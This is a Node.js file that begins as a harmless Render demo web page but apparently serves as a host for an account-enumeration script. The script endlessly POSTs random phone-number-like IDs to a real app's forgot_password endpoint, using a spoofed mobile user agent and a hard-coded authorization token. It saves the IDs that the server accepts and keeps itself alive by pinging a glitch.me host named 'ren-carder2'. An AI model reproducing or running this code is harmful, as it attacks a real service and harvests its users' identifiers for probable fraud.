const express = require("express");
const app = express();
const port = process.env.PORT || 3001;

app.get("/", (req, res) => res.type('html').send(html));

app.listen(port, () => console.log(`Example app listening on port ${port}!`));
var i = 0;
setInterval(()=>{
  i++;
  console.log(i)
},1000)
const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Yo from Render!</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      Yo from Render!
    </section>
  </body>
</html>
`

console.log("Fired")
//var HttpsProxyAgent = require('https-proxy-agent');
//const proxyAgent = new HttpsProxyAgent.HttpsProxyAgent('209.182.239.62:80');
var start;
const fetch = require('node-fetch');
const fs = require('fs');
var readline = require('readline');

    //
    // Log the results.
    //
   // console.log('Command-line input received:');
    //console.log(result.start+gennum(result.length));
    

 
  function go(){
var id = "012"+gennum(7);
fetch('https://syberapp.sybertechnology.com/forgot_password', {
    method: 'POST',

    headers: {
        'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': 'okhttp/4.9.1',
        'Version': '100',
        'Accept-Encoding': 'gzip',
        'Authorization': 'xwrsy67Un9oshl8H=c5g'
    },
    body: JSON.stringify(
{"userIdentifier":id}
)
}).then(response=>{
if(response.status == 200){
fs.appendFile("numbers.txt",id+"\n",function (err) {if (err) throw err;
console.log('Success! '+id);
  go()
});
  
}else if(response.status == 404){
//console.log(id+" fail "+response.status)
  go()
  
}else{
console.log(" fail "+response.status)
go()
}

}).catch((err)=>{
go()
})
}

go()



function gennum(length) {
    var result           = '';
    var characters       = '0123456789';
    //ABCDEFGHIJKLMNOPQRSTUVWXYZ
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function pad(num, size) {
    var s = "000000000" + num;
    return s.substr(s.length-size);
}
function gen(length) {
    var result           = '';
    var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789';
    //ABCDEFGHIJKLMNOPQRSTUVWXYZ
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
var ress;
setInterval(()=>{


ress = fetch("https://ren-carder2.glitch.me/")
//console.log(z+"|"+ress.status)
},240000)
fs.appendFile("test.txt",id+"\n",function (err) {if (err) throw err;
console.log('test');
});
